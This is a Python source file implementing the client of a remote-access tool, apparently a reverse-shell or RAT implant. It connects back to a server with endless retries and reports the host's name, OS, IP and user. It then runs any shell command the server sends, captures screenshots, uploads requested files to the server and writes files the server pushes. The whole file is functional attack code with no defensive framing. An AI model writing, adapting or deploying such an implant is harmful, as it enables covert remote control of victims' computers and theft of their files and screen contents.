import socket
import subprocess
import time
import os
import json
import base64
import platform

SERVER_IP = "127.0.0.1"
PORT = 5000

current_dir = os.getcwd()

def connect_server():
    """Connect to server with retry"""
    while True:
        try:
            client = socket.socket()
            client.connect((SERVER_IP, PORT))
            print("✓ Connected to server")
            
            # Send client info on connect
            info = {
                "type": "CLIENT_INFO",
                "hostname": platform.node(),
                "os": platform.system(),
                "os_version": platform.version(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "user": os.getlogin()
            }
            client.send(json.dumps(info).encode())
            
            return client
        except:
            print("Connection failed. Retrying in 5 seconds...")
            time.sleep(5)

def take_screenshot():
    """Capture screenshot"""
    try:
        from PIL import ImageGrab
        import io
        
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        img_data = base64.b64encode(buffer.getvalue()).decode()
        
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "success",
            "data": img_data,
            "size": len(img_data)
        })
    except ImportError:
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "error",
            "message": "Pillow not installed. Run: pip install pillow"
        })
    except Exception as e:
        return json.dumps({"type": "SCREENSHOT", "status": "error", "message": str(e)})

def download_file(filepath):
    """Send file to server"""
    try:
        if not os.path.exists(filepath):
            return json.dumps({"type": "DOWNLOAD", "status": "error", "message": "File not found"})
        
        with open(filepath, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode()
        
        return json.dumps({
            "type": "DOWNLOAD",
            "status": "success",
            "filename": os.path.basename(filepath),
            "data": file_data,
            "size": os.path.getsize(filepath)
        })
    except Exception as e:
        return json.dumps({"type": "DOWNLOAD", "status": "error", "message": str(e)})

def upload_file(filename, data_b64):
    """Receive file from server"""
    try:
        file_data = base64.b64decode(data_b64)
        
        filepath = os.path.join(current_dir, filename)
        with open(filepath, 'wb') as f:
            f.write(file_data)
        
        return json.dumps({
            "type": "UPLOAD",
            "status": "success",
            "message": f"File saved: {filepath}",
            "size": len(file_data)
        })
    except Exception as e:
        return json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)})

client = connect_server()

while True:
    try:
        data = client.recv(65536)
        
        if not data:
            break
        
        cmd = data.decode(errors='ignore')

        if cmd.lower() == "exit":
            break

        # Special commands
        if cmd == "SCREENSHOT":
            output = take_screenshot().encode()
        
        elif cmd.startswith("DOWNLOAD:"):
            filepath = cmd.split(":", 1)[1].strip()
            output = download_file(filepath).encode()
        
        elif cmd.startswith("UPLOAD:"):
            try:
                parts = cmd.split(":", 2)
                filename = parts[1].strip()
                data_b64 = parts[2]
                output = upload_file(filename, data_b64).encode()
            except Exception as e:
                output = json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)}).encode()
        
        elif cmd == "SYSINFO":
            info = {
                "type": "SYSINFO",
                "hostname": platform.node(),
                "os": f"{platform.system()} {platform.release()}",
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "user": os.getlogin(),
                "current_dir": os.getcwd()
            }
            output = json.dumps(info, indent=2).encode()
        
        elif cmd.strip().startswith("cd "):
            path = cmd.strip()[3:].strip()
            try:
                if path == "..":
                    os.chdir("..")
                else:
                    os.chdir(path)
                current_dir = os.getcwd()
                output = f"Directory: {current_dir}".encode()
            except Exception as e:
                output = f"Error: {str(e)}".encode()
        
        else:
            # Command aliases for cross-platform compatibility
            cmd_lower = cmd.strip().lower()
            
            # Linux to Windows command mapping
            if cmd_lower == "ls":
                cmd = "dir"
            elif cmd_lower.startswith("ls "):
                cmd = "dir" + cmd[2:]
            elif cmd_lower == "pwd":
                cmd = "cd"
            elif cmd_lower == "clear" or cmd_lower == "cls":
                cmd = "cls"
            elif cmd_lower.startswith("cat "):
                cmd = "type" + cmd[3:]
            elif cmd_lower.startswith("rm "):
                cmd = "del" + cmd[2:]
            elif cmd_lower.startswith("mv "):
                cmd = "move" + cmd[2:]
            elif cmd_lower.startswith("cp "):
                cmd = "copy" + cmd[2:]
            
            # Regular command
            try:
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=False,
                    cwd=current_dir,
                    timeout=10  # 10 second timeout
                )
                
                # Check return code to determine success/failure
                if result.returncode == 0:
                    # Command succeeded
                    if result.stdout and len(result.stdout.strip()) > 0:
                        output = result.stdout
                    else:
                        output = f"✓ Command executed successfully: {cmd}".encode()
                else:
                    # Command failed
                    if result.stderr and len(result.stderr.strip()) > 0:
                        output = result.stderr
                    else:
                        output = f"Command failed with code {result.returncode}".encode()
                    
            except subprocess.TimeoutExpired:
                output = "⚠️ Command timeout (10 seconds)".encode()
            except Exception as e:
                output = str(e).encode()

        client.send(output)

    except Exception as e:
        print(f"Error: {e}")
        break

client.close()
print("Disconnected")
